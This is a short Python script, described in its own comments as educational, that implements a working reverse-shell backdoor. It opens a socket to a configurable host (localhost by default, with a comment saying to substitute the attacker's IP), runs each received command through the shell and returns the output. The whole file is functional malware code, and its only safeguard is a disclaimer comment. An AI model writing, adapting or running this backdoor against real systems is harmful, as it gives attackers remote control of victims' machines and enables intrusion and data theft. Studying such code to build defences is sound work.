import socket
import subprocess

# Configuration for the backdoor connection
HOST = '127.0.0.1'  # Use a secure lab environment for testing; replace with the attacker's IP in a controlled setup
PORT = 12345         # Port to establish communication

def backdoor():
    """
    A simple backdoor for educational purposes, demonstrating how unauthorized remote command execution works.
    WARNING: Use this only in controlled environments with permission.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
            connection.connect((HOST, PORT))
            while True:
                # Receive command from the attacker
                command = connection.recv(1024).decode('utf-8')
                if command.lower() == "exit":  # Exit the loop on "exit" command
                    break
                try:
                    # Execute the received command and capture the output
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except Exception as error:
                    result = f"Error: {error}".encode('utf-8')
                
                # Send the result back to the attacker nicely
                connection.send(result)
    except Exception as e:
        print(f"Error establishing backdoor: {e}")

if __name__ == "__main__":
    backdoor()
